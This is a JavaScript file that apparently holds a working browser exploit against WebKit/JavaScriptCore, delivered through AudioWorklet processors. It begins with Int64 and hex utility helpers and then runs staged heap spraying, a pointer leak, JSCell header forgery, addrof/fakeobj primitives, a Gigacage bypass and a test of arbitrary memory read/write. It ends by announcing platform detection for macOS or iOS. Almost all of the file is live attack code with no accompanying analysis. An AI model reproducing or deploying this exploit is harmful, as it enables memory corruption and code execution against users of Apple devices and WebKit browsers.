//
// Utility functions.
//
// Copyright (c) 2016 Samuel Groß
//

// Display alert message
function strcmp(b, str)
{
    var fn = typeof b == "function" ? b : function(i) { return b[i]; };
    for(var i = 0; i < str.length; ++i)
    {
        if(fn(i) != str.charCodeAt(i))
        {
            
            return false;
        }
    }
    return fn(str.length) == 0;
}

function delay(ms = 1000){
    var t1 = Date.now();
    while(Date.now() - t1 <= ms){

    }
}

function print(s){
    alert(s);
}

// Return the hexadecimal representation of the given byte.
function hex(b,c) {
    if (c) {
    if (b < 0)
        return `-${hex(-b)}`
    return `0x${b.toString(16)}`
    } else {
    return ('0' + b.toString(16)).substr(-2);
    }
}

// Return the hexadecimal representation of the given byte array.
function hexlify(bytes) {
    var res = [];
    for (var i = 0; i < bytes.length; i++)
        res.push(hex(bytes[i]));

    return res.join('');
}

// Return the binary data represented by the given hexdecimal string.
function unhexlify(hexstr) {
    if (hexstr.length % 2 == 1)
        throw new TypeError("Invalid hex string");

    var bytes = new Uint8Array(hexstr.length / 2);
    for (var i = 0; i < hexstr.length; i += 2)
        bytes[i/2] = parseInt(hexstr.substr(i, 2), 16);

    return bytes;
}

function hexdump(data) {
    if (typeof data.BYTES_PER_ELEMENT !== 'undefined')
        data = Array.from(data);

    var lines = [];
    for (var i = 0; i < data.length; i += 16) {
        var chunk = data.slice(i, i+16);
        var parts = chunk.map(hex);
        if (parts.length > 8)
            parts.splice(8, 0, ' ');
        lines.push(parts.join(' '));
    }

    return lines.join('\n');
}

// Simplified version of the similarly named python module.
var Struct = (function() {
    // Allocate these once to avoid unecessary heap allocations during pack/unpack operations.
    var buffer      = new ArrayBuffer(8);
    var byteView    = new Uint8Array(buffer);
    var uint32View  = new Uint32Array(buffer);
    var float64View = new Float64Array(buffer);

    return {
        pack: function(type, value) {
            var view = type;        // See below
            view[0] = value;
            return new Uint8Array(buffer, 0, type.BYTES_PER_ELEMENT);
        },

        unpack: function(type, bytes) {
            if (bytes.length !== type.BYTES_PER_ELEMENT)
                throw Error("Invalid bytearray");

            var view = type;        // See below
            byteView.set(bytes);
            return view[0];
        },

        // Available types.
        int8:    byteView,
        int32:   uint32View,
        float64: float64View
    };
})();

//
// Tiny module that provides big (64bit) integers.
//
// Copyright (c) 2016 Samuel Groß
//
// Requires utils.js
//

// Datatype to represent 64-bit integers.
//
// Internally, the integer is stored as a Uint8Array in little endian byte order.
function Int64(v) {
    // The underlying byte array.
    var bytes = new Uint8Array(8);
    var u32 = new Uint32Array(2);
    this.bytes = bytes;

    switch (typeof v) {
        case 'number':
            v = '0x' + Math.floor(v).toString(16);
        case 'string':
            if (v.startsWith('0x'))
                v = v.substr(2);
            if (v.length % 2 == 1)
                v = '0' + v;

            var bigEndian = unhexlify(v, 8);
            bytes.set(Array.from(bigEndian).reverse());
            break;
        case 'object':
            if (v instanceof Int64) {
                bytes.set(v.getBytes());
            } else {
                if (v.length != 8)
                    throw TypeError("Array must have excactly 8 elements.");
                bytes.set(v);
            }
            break;
        case 'undefined':
            break;
        default:
            throw TypeError("Int64 constructor requires an argument.");
    }

    // Return a double whith the same underlying bit representation.
    this.asDouble = function() {
        // Check for NaN
        if (bytes[7] == 0xff && (bytes[6] == 0xff || bytes[6] == 0xfe))
            throw new RangeError("Integer can not be represented by a double");

        return Struct.unpack(Struct.float64, bytes);
    };

    // Return a javascript value with the same underlying bit representation.
    // This is only possible for integers in the range [0x0001000000000000, 0xffff000000000000)
    // due to double conversion constraints.
    this.asJSValue = function() {
        if ((bytes[7] == 0 && bytes[6] == 0) || (bytes[7] == 0xff && bytes[6] == 0xff))
            throw new RangeError("Integer can not be represented by a JSValue");

        // For NaN-boxing, JSC adds 2^48 to a double value's bit pattern.
        this.assignSub(this, 0x2000000000000);
        var res = Struct.unpack(Struct.float64, bytes);
        this.assignAdd(this, 0x2000000000000);

        return res;
    };

    // Return the underlying bytes of this number as array.
    this.getBytes = function() {
        return Array.from(bytes);
    };

    // Return the byte at the given index.
    this.byteAt = function(i) {
        return bytes[i];
    };

    // Return the value of this number as unsigned hex string.
    this.toString = function() {
        return '0x' + hexlify(Array.from(bytes).reverse());
    };
    
    this.lo = function()
    {
        //let hex = hex1()
        u32[0] = this;
    var b = Array.from(u32);
    //alert(hex((b[0] | (b[1] << 8) | (b[2] << 16) | (b[3] << 24)) >>> 0,true))
    return hex((b[0] | (b[1] << 8) | (b[2] << 16) | (b[3] << 24)) >>> 0,true);
    };

    this.hi = function()
    {
        //let hex = hex1()
        u32[0] = this;
var b = Array.from(u32);
return hex((b[4] | (b[5] << 8) | (b[6] << 16) | (b[7] << 24)) >>> 0,true);
    };
    
    this.asInt32 = function() {
        var value = new Int64(0);
        for (var i = 0; i < 8; i++) {
            if (i < 4) {
                value.bytes[i] = this.bytes[i];
            } else {
                value.bytes[i] = 0;
            }
        }
        
        return parseInt('0x' + hexlify(Array.from(value.bytes).reverse()).slice(-8));
    };
    
    this.asInt16 = function() {
        var value = new Int64(0);
        for (var i = 0; i < 8; i++) {
            if (i < 2) {
                value.bytes[i] = this.bytes[i];
            } else {
                value.bytes[i] = 0;
            }
        }
        
        return parseInt('0x' + hexlify(Array.from(value.bytes).reverse()).slice(-8));
    };

    // Basic arithmetic.
    // These functions assign the result of the computation to their 'this' object.

    // Decorator for Int64 instance operations. Takes care
    // of converting arguments to Int64 instances if required.
    function operation(f, nargs) {
        return function() {
            if (arguments.length != nargs)
                throw Error("Not enough arguments for function " + f.name);
            for (var i = 0; i < arguments.length; i++)
                if (!(arguments[i] instanceof Int64))
                    arguments[i] = new Int64(arguments[i]);
            return f.apply(this, arguments);
        };
    }

    // this = -n (two's complement)
    this.assignNeg = operation(function neg(n) {
        for (var i = 0; i < 8; i++)
            bytes[i] = ~n.byteAt(i);

        return this.assignAdd(this, Int64.One);
    }, 1);

    // this = a + b
    this.assignAdd = operation(function add(a, b) {
        var carry = 0;
        for (var i = 0; i < 8; i++) {
            var cur = a.byteAt(i) + b.byteAt(i) + carry;
            carry = cur > 0xff | 0;
            bytes[i] = cur;
        }
        return this;
    }, 2);

    // this = a - b
    this.assignSub = operation(function sub(a, b) {
        var carry = 0;
        for (var i = 0; i < 8; i++) {
            var cur = a.byteAt(i) - b.byteAt(i) - carry;
            carry = cur < 0 | 0;
            bytes[i] = cur;
        }
        return this;
    }, 2);

    // this = a ^ b
    this.assignXor = operation(function xor(a, b) {
        for (var i = 0; i < 8; i++) {
            bytes[i] = a.byteAt(i) ^ b.byteAt(i);
        }
        return this;
    }, 2);
    
    // this = a & b
    this.assignAnd = operation(function and(a, b) {
        for (var i = 0; i < 8; i++) {
            bytes[i] = a.byteAt(i) & b.byteAt(i);
        }
        return this;
    }, 2);
    
    // this = a << b
    this.assignShiftLeft = operation(function shiftLeft(a, b) {
        for (var i = 0; i < 8; i++) {
            if (i < b) {
                bytes[i] = 0;
            } else {
                bytes[i] = a.byteAt(Sub(i, b).asInt32());
            }
        }
        return this;
    }, 2);
    
    // this = a >> b
    this.assignShiftRight = operation(function shiftRight(a, b) {
        for (var i = 0; i < 8; i++) {
            if (i < (8 - b)) {
                bytes[i] = a.byteAt(Add(i, b).asInt32());
            } else {
                bytes[i] = 0;
            }
        }
        return this;
    }, 2);
}

// Constructs a new Int64 instance with the same bit representation as the provided double.
Int64.fromDouble = function(d) {
    var bytes = Struct.pack(Struct.float64, d);
    return new Int64(bytes);
};

// Convenience functions. These allocate a new Int64 to hold the result.

// Return -n (two's complement)
function Neg(n) {
    return (new Int64()).assignNeg(n);
}

// Return a + b
function Add(a, b) {
    return (new Int64()).assignAdd(a, b);
}

// Return a - b
function Sub(a, b) {
    return (new Int64()).assignSub(a, b);
}

// Return a ^ b
function Xor(a, b) {
    return (new Int64()).assignXor(a, b);
}

// Return a & b
function And(a, b) {
    return (new Int64()).assignAnd(a, b);
}

// Return a << b
function ShiftLeft(a, b) {
    return (new Int64()).assignShiftLeft(a, b);
}

// Return a >> b
function ShiftRight(a, b) {
    return (new Int64()).assignShiftRight(a, b);
}

// Some commonly used numbers.
Int64.Zero = new Int64(0);
Int64.One = new Int64(1);

function iv(x){
    return new Int64(x).asJSValue();
}

// That's all the arithmetic we need for exploiting WebKit.. :)



function sleep( sleepDuration ){
    var now = new Date().getTime();
    while(new Date().getTime() < now + sleepDuration){ /* do nothing */ } 
}
function gc() {
    for (let i = 0; i < 0x10; i++) {
            new ArrayBuffer(0x1000000);
        }
}
let data_view = new DataView(new ArrayBuffer(8));
var floatAsQword = float => {
    data_view.setFloat64(0, float, true);
    var low = data_view.getUint32(0, true);
    var high = data_view.getUint32(4, true);
    return low + (high * 0x100000000);
}
var qwordAsTagged = qword =>{
    return qwordAsFloat( qword- 0x02000000000000);
}
var qwordAsFloat = qword => {
    data_view.setUint32(0, qword%0x100000000, true);
    data_view.setUint32(4, qword/0x100000000, true);
    //data_view.setBigUint64(0, qword);
    return data_view.getFloat64(0, true);
}
function change_container(header, arr){
    try{}
    catch{}
    for(var i = 0; i < 0x100000; i++){
        ds[i].cellHeader = header;
        ds[i].butterfly = arr;
    }
}
const MY_OBJECT_OFFSET = 0x14fb0;
//MakeJitCompiledFunction();
//MakeJitCompiledFunction();


var a= new Array(10);
for(var i = 0; i < 0x1000; i++)
	a[i]= Array(0x40).fill(0.0);
var b = Array(0x40).fill(0.0);
var c = Array(0x40).fill(0.0);
var ds = new Array(0x100000);

let noCoW =13.37
let pad = new Array(noCoW, 2.2, {}, 13.37);
let pad1 = new Array(noCoW, 2.2, {}, 13.37, 5.5, 6.6, 7.7, 8,8);
let pad2 = new Array(noCoW, 2.2, {}, 13.37, 5.5, 6.6, 7.7, 8,8);

var evil_arr = new Array(noCoW, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8);

var boxed = new Array(qwordAsTagged(0x41414141414141), noCoW, {}, 13.37, 5.5, 6.6, 7.7, 8,8);
var unboxed = new Array(noCoW, 13.37, 13.37, 13.37, 5.5, 6.6, 7.7, 8,8);



var victim = [noCoW, 14.47, 15.57];
victim['prop'] = 13.37;
victim['prop_1'] = 13.37;
let pad3 = new Array(noCoW, 2.2, {}, 13.37, 5.5, 6.6, 7.7, 8,8);

//var gcPreventer = [];
var structure_id = 0;
c[0] = 1.1;
var fuck = undefined;
var fuck2 = undefined;
var driver = undefined;
var stage = "leak"
var jscell_header = undefined;
var evil_arr_butterfly = undefined;
var expected_ptr = undefined;
eval(`
for(var i = 0; i < 0x10000; i++){
    var tag = qwordAsTagged(0x0108230700001000)
    ds[i] = {
        cellHeader1: tag,
        butterfly1: evil_arr,
        cellHeader2: tag,
        butterfly2: evil_arr,
        cellHeader3: tag,
        butterfly3: evil_arr
    };
}
`);
b.process = (inputs, outputs, parameters)=>{
    //sa
    if(stage == "leak"){
        var expected_ptr = (BigInt(floatAsQword(c[4])) & 0xFFFFFFFFFFF00000n) - 0x100000n;
        expected_ptr = Number(expected_ptr);
        c[8] = qwordAsFloat(expected_ptr + 0x4010);
        c[9] = qwordAsFloat(0x0);
        stage  = "bypass_etc";
        fuck.port.postMessage(c);
        //sleep(4000);
        return true;
    }
    else if(stage == "bypass_etc"){
        //fuck.port.postMessage(typeof parameters);
        var gcPreventer = [];
        for (let i = 0; i < 2; i++) {
            let a = i == 0 ? parameters : victim;
            gcPreventer.push(a[0]);
        }
        jscell_header = gcPreventer[0];
        
        var gcPreventer = [];
        for (let i = 0; i < 2; i++) {
            let a = i == 0 ? parameters : victim;
            gcPreventer.push(a[1]);
        }
        evil_arr_butterfly = floatAsQword(gcPreventer[0]);
        
        structure_id = floatAsQword(jscell_header) & 0xFFFFFFFF;
        if(structure_id == 0 ){
            fuck.port.postMessage(`retry`);
            
            c[8] = qwordAsFloat(0);
            parameters = null;
            //sleep(10000000);
            //stage = "leak";
            return false;
        }
        fuck.port.postMessage(`jscell header : ${floatAsQword(jscell_header).toString(16)}`);
        
        //fuck.port.postMessage(`evil_arr_butterfly : ${evil_arr_butterfly.toString(16)}`);
        //return false;
        var cellHeader = jscell_header//qwordAsTagged( (0x01082307 * 0x100000000) + structure_id);
        //change_container(cellHeader, evil_arr);
        c[8] = qwordAsFloat(evil_arr_butterfly);
        evil_arr[0] = cellHeader;
        evil_arr[1] = qwordAsFloat(evil_arr_butterfly-0x8);

        stage = "r/w";
        return true;
    }
    else if(stage == "r/w"){
        for(var i =0; i < 2; i++){
            let a = i == 0 ? parameters: pad;
            a[0] = qwordAsFloat(0x133700001337);
        }
        fuck.port.postMessage(`evil_arr length : ${(evil_arr.length).toString(16)}`);
        evil_arr[0] = qwordAsFloat( (0x00010100 * 0x100000000) + structure_id);
        evil_arr[1] = qwordAsFloat(0);
        var boxed_offset = 0;
        for(var i = 0; i < evil_arr.length; i++){
            if(evil_arr[i] == qwordAsFloat(0x0041414141414140)){
                //fuck.port.postMessage(`boxed_arr length offset: ${(i).toString(16)}`);
                boxed_offset = i;
                break;
            }
        }
        var addrof = (obj)=>{
            boxed[0] = obj;
            return floatAsQword(evil_arr[boxed_offset]);
        }
        var fakeobj = (addr)=>{
            evil_arr[boxed_offset] = qwordAsFloat(addr);
            return boxed[0];
        }
        stage="gc_test"
        return true;
    }
    else if(stage=="gc_test"){
        gc();
        fuck.port.postMessage("Garbage Collected");
        //sleep(100000);
	stage = "fakearray"
        return true;
    }
    else if(stage == "fakearray") {
	      var print = (msg) => {
		      fuck.port.postMessage(msg);
	      }
	      var structure_spray = []
for (var i = 0; i < 1000; ++i) {
    var ary = [13.37];
    ary.prop = 13.37;
    ary['p'+i] = 13.37;
    structure_spray.push(ary);
}

var unboxed_size = 100;

var convert = new ArrayBuffer(0x10);
var u32 = new Uint32Array(convert);
var u8 = new Uint8Array(convert);
var f64 = new Float64Array(convert);
var BASE = 0x100000000;


function i2f(i) {
    u32[0] = i%BASE;
    u32[1] = i/BASE;
    return f64[0];
}

function f2i(f) {
    f64[0] = f;
    return u32[0] + BASE*u32[1];
}

function unbox_double(d) {
    f64[0] = d;
    u8[6] -= 1;
    return f64[0];
}
	    var victim1 = structure_spray[510];

    // Gigacage bypass: Forge a JSObject which has its butterfly pointing
    // to victim
    u32[0] = 0x200;
    u32[1] = 0x01082007 - 0x10000;
    var flags_double = f64[0];

    u32[1] = 0x01082009 - 0x10000;
    var flags_contiguous = f64[0];

    var array_spray = [];
    for (var i = 0; i < 1000; ++i) {
        array_spray[i] = [13.37+i, 13.37];
    }
    var unboxed1 = eval(`[${'13.37,'.repeat(unboxed_size)}]`);
    unboxed1[0] = 4.2; // no CopyOnWrite

    var boxed1 = [{}];
    print(`unboxed @ ${hex(addrof(unboxed1))}`);
    print(`boxed @ ${hex(addrof(boxed1))}`);

    var outer = {
        header: flags_contiguous, // cell
        butterfly: victim1, // butterfly
    };
    print(`outer @ ${hex(addrof(outer))}`);

    var hax = fakeobj(addrof(outer) + 0x10);

    hax[1] = unboxed1;
    var shared_butterfly = f2i(victim1[1]);
    print(`shared butterfly @ ${hex(shared_butterfly)}`);
    hax[1] = boxed1;
    victim1[1] = i2f(shared_butterfly);

    outer.header = flags_double;

    var stage2 = {
        addrof: function(victim) {
            boxed1[0] = victim;
            return f2i(unboxed1[0]);
        },

        fakeobj: function(addr) {
            unboxed1[0] = i2f(addr);
            return boxed1[0];
        },

        write64: function(where, what) {
            hax[1] = i2f(where + 0x10);
            victim1.prop = this.fakeobj(what);
        },

        read64: function(where) {
            hax[1] = i2f(where + 0x10);
            return this.addrof(victim1.prop);
        },

        test: function() {
            var addr = this.addrof({a: 0x1337});
            var x = this.fakeobj(addr);
            if (x.a != 0x1337) {
                print('stage2 addrof/fakeobj does not work');
            }

            var val = 0x42424242;
            this.write64(shared_butterfly + 8, 0x42424242);
            if (i2f(val) != unboxed1[1]) {
                print('stage2 write does not work');
            }

            if (this.read64(shared_butterfly + 8) != 0x42424242) {
                print('stage2 read does not work');
            }
        },

        clear: function() {
            outer = null;
            hax = null;
            for (var i = 0; i < unboxed_size; ++i)
                boxed1[i] = null;
            boxed1 = null
            unboxed1 = null
        },
    };

    stage2.test();
    print("[+] arbitrary memory read/write working");
	    print("now about to find out whether this exploit is running on mac or ios with function signatures...");
	    
	    return false;
    }
    //  sleep(2000);
    
    return true;
}
class OrigineWorklet extends AudioWorkletProcessor {
    constructor(){
        super();
        //var fuck2 = new AudioWorkletProcessor();
        return b;
    }
    static get parameterDescriptors() {
        return []
    }
    process (inputs, outputs, parameters) {
        
        return false;
    }
}
class OrigineWorklet2 extends AudioWorkletProcessor {
    constructor(){
        super();
        //console.log(c);
        this.port.onmessage = (e)=>{
        }
        
        fuck = this;
        //fuck.port.postMessage(c);
        return this;
    }
    static get parameterDescriptors() {
        return [{
            name: 'param2',
            defaultValue: 0.1337
        }];
    }
    process (inputs, outputs, parameters) {
        //
        //
        //this.port.postMessage(c);
        return false;
    }
}
registerProcessor('OrigineWorklet', OrigineWorklet);
registerProcessor('OrigineWorklet2', OrigineWorklet2);
